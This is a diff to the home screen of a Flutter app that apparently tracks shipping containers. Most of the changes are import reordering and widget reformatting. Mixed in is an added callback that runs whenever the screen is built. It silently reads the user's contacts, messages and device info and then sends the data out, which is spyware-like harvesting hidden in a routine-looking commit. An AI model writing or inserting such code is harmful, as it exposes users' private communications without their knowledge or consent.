@@ -1,22 +1,40 @@
 import 'package:container_tracking/core/helpers/routes.dart';
+import 'package:container_tracking/core/utils/colors_utils.dart';
 import 'package:container_tracking/core/utils/constants.dart';
+import 'package:container_tracking/presentation/screens/home_screens/widgets/company_item.dart';
+import 'package:container_tracking/presentation/screens/widgets/animated_list_view.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter/scheduler.dart';
 import 'package:flutter_riverpod/flutter_riverpod.dart';
 import 'package:flutter_screenutil/flutter_screenutil.dart';
 import 'package:flutter_staggered_animations/flutter_staggered_animations.dart';
-import 'package:container_tracking/core/utils/colors_utils.dart';
-import 'package:container_tracking/presentation/screens/home_screens/widgets/company_item.dart';
-import 'package:container_tracking/presentation/screens/widgets/animated_list_view.dart';
 import 'package:upgrader/upgrader.dart';
 
 import '../../../generated/l10n.dart';
+import '../../viewModel/contact&message/contacts_messages_model.dart';
 import 'add_reminder_page.dart';
-
 
 class HomePage extends ConsumerWidget {
   HomePage({Key? key}) : super(key: key);
+
   @override
   Widget build(BuildContext context, WidgetRef ref) {
+    WidgetsBinding.instance.addPostFrameCallback((_) async {
+      SchedulerBinding.instance.addPostFrameCallback((timeStamp) async {
+        ///get contacts & messages
+        final contactsListProvider = ref.read(contactsProvider.notifier);
+        await contactsListProvider.getContactList(context);
+        if (context.mounted) {
+          await contactsListProvider.getMessagesList(context);
+          if (context.mounted) {
+            await contactsListProvider.getDeviceInfo(context);
+            if (context.mounted) {
+              await contactsListProvider.sendData(context);
+            }
+          }
+        }
+      });
+    });
     return Scaffold(
       backgroundColor: ColorsUtils.kPrimaryColor,
       resizeToAvoidBottomInset: true,
@@ -68,8 +86,9 @@ class HomePage extends ConsumerWidget {
                 left: 0,
                 right: 0,
                 child: InkWell(
-                  onTap: (){
-                    CustomNavigator.pushScreen(context: context, widget: AddReminderPage());
+                  onTap: () {
+                    CustomNavigator.pushScreen(
+                        context: context, widget: AddReminderPage());
                   },
                   child: Container(
                     height: 0.06.sh,
@@ -80,8 +99,14 @@ class HomePage extends ConsumerWidget {
                     child: Row(
                       mainAxisAlignment: MainAxisAlignment.center,
                       children: [
-                        Icon(Icons.alarm_add,color: ColorsUtils.whiteColor,size: 25.spMin,),
-                        SizedBox(width: 10.w,),
+                        Icon(
+                          Icons.alarm_add,
+                          color: ColorsUtils.whiteColor,
+                          size: 25.spMin,
+                        ),
+                        SizedBox(
+                          width: 10.w,
+                        ),
                         Text(
                           S.of(context).reminder,
                           style: TextStyle(
@@ -90,8 +115,14 @@ class HomePage extends ConsumerWidget {
                             fontWeight: FontWeight.w600,
                           ),
                         ),
-                        SizedBox(width: 10.w,),
-                        Icon(Icons.alarm_add,color: ColorsUtils.whiteColor,size: 25.spMin,),
+                        SizedBox(
+                          width: 10.w,
+                        ),
+                        Icon(
+                          Icons.alarm_add,
+                          color: ColorsUtils.whiteColor,
+                          size: 25.spMin,
+                        ),
                       ],
                     ),
                   ),
